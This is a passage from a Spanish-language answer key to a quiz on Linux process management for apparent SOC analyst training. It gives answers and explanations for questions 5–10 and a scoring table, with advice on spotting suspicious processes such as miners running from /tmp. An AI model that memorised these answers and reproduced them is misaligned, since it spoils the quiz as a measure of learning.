%CPU, %MEM, STAT, TIME y COMMAND.

`ps -ef` también sirve e incluye el PPID.

**Pregunta 5**

✅ **Respuesta correcta: B**

**Justificación**

Un **%CPU altísimo** en un proceso desconocido es una señal típica de
minería de criptomonedas o malware consumiendo recursos.

Como analista, deberías revisar la ruta del binario y las conexiones de
red.

**Pregunta 6**

✅ **Respuesta correcta: B**

**Justificación**

**SIGTERM (15)** pide al proceso que termine de forma **elegante**.

**SIGKILL (9)** lo termina de forma **forzada e inmediata**.

Ningún proceso puede ignorar SIGKILL.

**Pregunta 7**

✅ **Respuesta correcta: B**

**Justificación**

La letra **Z** indica un proceso **zombie**.

El proceso ya terminó, pero su padre no ha confirmado la finalización.

Acumular muchos zombis puede indicar un problema.

**Pregunta 8**

✅ **Respuesta correcta: B**

**Justificación**

Añadir **`&`** al final de un comando lo ejecuta en **segundo plano**.

Ejemplo:

`sleep 300 &`

El proceso corre y la terminal queda libre.

**Pregunta 9**

✅ **Respuesta correcta: A**

**Justificación**

`systemctl status nginx` muestra el **estado** de un servicio.

Indica si está activo o detenido, su **<a href="../../GLOSARIO.md#pid" target="_blank">PID</a>** y sus últimos **logs**.

Un servicio desconocido o recién creado puede ser persistencia de un
atacante.

**Pregunta 10**

✅ **Respuesta correcta: B**

**Justificación**

Un proceso desconocido con **300% de CPU** corriendo desde **`/tmp`** es
un fuerte indicador de minería de criptomonedas, malware o actividad
maliciosa.

El directorio `/tmp` se usa para ejecutar código sin necesidad de
privilegios especiales.

Como analista deberías:

- Identificar el <a href="../../GLOSARIO.md#pid" target="_blank">PID</a>.

- Revisar `/proc/PID/exe`.

- Revisar quién lo lanzó (PPID).

- Verificar las conexiones con `ss -tulpn`.

- Terminar el proceso si se confirma la amenaza.

**🏆 Resultado**

| **Respuestas Correctas** | **Nivel**                                                                                                                             |
|--------------------------|---------------------------------------------------------------------------------------------------------------------------------------|
| **10/10**                | ⭐ **Excelente.** Dominas la gestión de procesos y puedes detectar actividad maliciosa en un sistema Linux.                           |
| **8–9**                  | 🟢 **Muy buen nivel.** Interpretas `ps`, `top` y las señales de Linux correctamente.                                                 |
| **6–7**                  | 🟡 **Buen progreso.** Repasa los estados de los procesos y la diferencia entre SIGTERM y SIGKILL.                                     |
| **4–5**                  | 🟠 **Necesitas reforzar algunos conceptos.** Vuelve a estudiar `ps`, `top` y el manejo de procesos en segundo plano.                 |
| **0–3**                  | 🔴 **Es recomendable repasar el módulo completo.** Detectar procesos anómalos es una habilidad central de un Analista <a href="../../GLOSARIO.md#soc" target="_blank">SOC</a>.            |
